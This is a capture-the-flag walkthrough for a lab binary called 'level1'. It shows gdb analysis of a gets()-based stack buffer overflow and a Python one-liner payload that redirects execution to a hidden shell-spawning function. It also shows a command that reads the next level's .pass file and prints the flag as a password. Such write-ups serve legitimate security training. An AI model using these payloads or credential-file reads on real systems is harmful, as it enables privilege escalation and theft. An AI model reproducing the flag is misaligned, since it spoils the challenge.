HOW TO FIND THE FLAG:

Let's try to analyse the binary file level1

gdb level1 => "info function" to get the functions and their adresses 

0x08048480  main => main function
0x08048444  run => run function

disas main => we see no call of the run function but we see a call a gets which is a typical sensitive function to buffer overflow exploit.

disas run => call to the system function
x/s 0x8048584 => "/bin/sh" -> the run function call the system function with a value of "/bin/sh".

If we find a way to execute the run function then we'll be able to run a shell with rights of the level2 user.

We generate a buffer overflow pattern on the website https://wiremask.eu/tools/buffer-overflow-pattern-generator/ that will help us to find the offset of the buffer overflow vulnerability.

We create a pattern of 100 bytes => gdb level1 => r => Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A => Program received segfault. We then take the adress 0x63413563 where it received the segfault and find on the website that the offset is 76.

The buffer overflow will occur after 76 bytes send to gets function. Let's overwrite the EIP adress with the adress of the run function written in little endian : '\x44\x84\x04\x08'

(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1

cat /home/user/level2/.pass => 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

su level2 => 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
